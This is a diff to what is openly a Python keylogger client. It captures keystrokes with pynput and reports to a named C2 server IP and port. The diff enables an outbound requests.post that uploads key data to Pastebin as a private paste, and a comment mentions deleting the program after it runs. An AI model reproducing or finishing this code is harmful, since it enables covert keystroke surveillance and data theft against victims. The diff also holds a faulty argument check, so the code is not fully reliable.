@@ -1,5 +1,7 @@
+from sys import argv
 from pynput.keyboard import Key, Listener
 import socket
+import requests
 from pastebin import PastebinAPI
 from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
@@ -24,8 +26,10 @@ def key_thread():
 
 def main():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    C2_ip = argv[1]
-    # C2_ip = "10.0.0.196" # C2 server IP
+    if len(argv) > 0:
+        C2_ip = argv[1]
+    else:
+        C2_ip = "10.0.0.196" # C2 server IP
     C2_port = 10101 # C2 server port (mismatch due to port-fowarding)
     C2_addr = (C2_ip, C2_port)
     
@@ -95,7 +99,7 @@ def main():
                 'api_paste_private': 1,
                 'api_paste_name': 'Untitled',
                 'api_paste_expire_date': '10M'}
-    # key_url = requests.post(url=pastebin_url, data=key_data)
+    key_url = requests.post(url=pastebin_url, data=key_data)
 
     print(key_url.text)  # print out url of paste
     # remove(argv[0])  # delete program after running
